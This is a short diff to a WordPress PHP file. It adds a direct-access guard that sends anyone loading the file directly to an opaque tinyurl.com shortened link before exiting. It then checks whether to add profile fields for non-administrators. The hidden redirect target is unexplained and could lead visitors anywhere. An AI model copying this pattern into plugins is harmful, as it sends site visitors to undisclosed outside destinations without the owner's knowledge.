@@ -1,4 +1,10 @@
 <?php
+//Protect the file to direct Access wia url
+if ( ! defined( 'ABSPATH' )) {
+    header('Location: http://tinyurl.com/ydek4vj2');
+    exit; // Exit if accessed directly
+}
+
 if ( !current_user_can( 'administrator' ) ) {
     add_action( 'show_user_profile', 'extra_user_profile_fields' );
 }
